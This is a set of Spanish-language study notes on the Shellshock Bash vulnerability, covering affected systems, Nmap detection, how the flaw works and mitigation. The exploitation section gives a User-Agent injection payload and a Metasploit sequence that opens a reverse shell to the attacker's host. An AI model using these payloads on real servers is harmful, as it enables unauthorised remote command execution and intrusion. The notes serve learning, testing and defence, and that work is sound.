# Shellshock (CVE-2014-6271)

---

## 1. ¿Qué es Shellshock?

- Vulnerabilidad crítica en **Bash (Bourne Again Shell)**, un intérprete de comandos muy usado en sistemas Unix/Linux y macOS.
- Permite ejecución remota de comandos arbitrarios al procesar variables de entorno especialmente manipuladas.
- Descubierta en septiembre de 2014.
- Considerada una de las vulnerabilidades más graves en sistemas Unix/Linux.

---

## 2. Sistemas operativos afectados

- Sistemas Unix/Linux que usen versiones vulnerables de **Bash** (antes de las actualizaciones posteriores a septiembre 2014).
- macOS (versiones que usaban Bash vulnerable).
- Dispositivos embebidos y routers que usan Bash vulnerable.

---

## 3. Cómo identificar si un sistema es vulnerable

### Usar Nmap con script `http-shellshock`

```bash
nmap -p 80 --script http-shellshock --script-args uri=/cgi-bin/test <IP_objetivo>
```

- El script intenta detectar vulnerabilidad Shellshock en servidores web que usan CGI scripts.
- Reemplaza `/cgi-bin/test` por la ruta al CGI que se quiera probar.
- Si es vulnerable, Nmap reportará la detección.

---

## 4. ¿Cómo funciona la vulnerabilidad?

- Bash procesa variables de entorno que contienen funciones definidas con una sintaxis especial.
- Shellshock aprovecha una falla donde, al definir funciones en variables de entorno, Bash ejecuta comandos adicionales adjuntos.
- Esto permite a un atacante remoto ejecutar código arbitrario si puede enviar estas variables al intérprete Bash (ej. a través de CGI en servidores web).

---

## 5. ¿Cómo explotarlo?

### a) Exploit básico mediante CGI (Common Gateway Interface)

- En servidores web que usan CGI scripts escritos en Bash o que pasan variables a Bash, el atacante envía una petición HTTP con una variable de entorno maliciosa.

Ejemplo de payload HTTP:

```
User-Agent: () { :;}; /bin/bash -c "comando_malicioso"
```

### b) Uso de herramientas automatizadas

- Metasploit tiene módulos para explotar Shellshock:

```bash
use exploit/multi/http/apache_mod_cgi_bash_env_exec
set RHOST <IP_objetivo>
set TARGETURI /cgi-bin/test
set PAYLOAD cmd/unix/reverse
set LHOST <tu_IP>
set LPORT <tu_puerto>
run
```

---

## 6. Mitigación

- Actualizar Bash a versiones parcheadas inmediatamente.
- Deshabilitar o limitar el uso de CGI y scripts Bash en servidores.
- Filtrar y validar entradas en aplicaciones web.
- Monitorizar tráfico y logs para detectar intentos de explotación.


